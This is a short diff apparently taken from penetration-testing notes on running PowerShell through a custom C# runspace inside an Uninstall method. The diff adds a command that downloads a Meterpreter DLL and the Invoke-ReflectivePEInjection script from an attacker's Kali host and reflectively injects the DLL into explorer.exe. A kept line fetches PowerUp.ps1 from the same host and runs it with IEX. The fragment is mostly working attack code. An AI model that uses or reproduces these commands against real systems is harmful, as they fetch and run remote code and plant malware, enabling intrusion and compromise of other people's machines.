@@ -46,6 +46,12 @@ Custom runspace C# code inside Uninstall method:
                   String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\test.txt";
                   
                   ***<comment>String cmd = "(New-Object System.Net.WebClient).DownloadString('http://<kali ip>/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\test.txt"; <comment>***
+
+                  ***<comment>Reflectively loading Meterpreter DLL into explorer.exe: 
+                  
+                  String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://<kali ip>/met.dll');(New-Object System.Net.WebClient).DownloadString('http://<kali ip>/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
+                  
+                  <comment>***
                   
                   Runspace rs = RunspaceFactory.CreateRunspace();
                   rs.Open();
